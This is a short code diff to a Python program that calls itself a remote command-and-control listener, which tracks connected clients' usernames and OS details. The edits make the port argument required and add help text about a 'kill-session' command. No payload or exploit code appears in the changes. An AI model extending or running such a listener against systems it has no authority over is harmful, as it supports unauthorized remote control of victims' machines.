@@ -10,8 +10,8 @@ current_writer = None
 
 def parse_arguments():
     parser = argparse.ArgumentParser(description='LSTNR - Remote Command & Control')
-    parser.add_argument('-p', '--port', type=int, default=443,
-                      help='Port to listen on (default: 443)')
+    parser.add_argument('-p', '--port', type=int, required=True,
+                      help='Port to listen on')
     return parser.parse_args()
 
 async def handle_client(reader, writer):
@@ -44,6 +44,7 @@ async def handle_client(reader, writer):
         print(f"[*] Username: {username}")
         print(f"[*] OS: {os_info}")
         print(f"[*] Connected: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+        print(f"[*] Type 'kill-session' to terminate the connection")
         
         current_session = client_ip
         current_writer = writer
@@ -98,6 +99,8 @@ async def start_server(port):
     """)
     print(f"[*] LSTNR running on port {port}")
     print("[*] Waiting for connections...")
+    print("[*] Use Ctrl+C to exit the listener")
+    print("[*] Type 'kill-session' to terminate a connected session")
     
     async with server:
         await server.serve_forever()
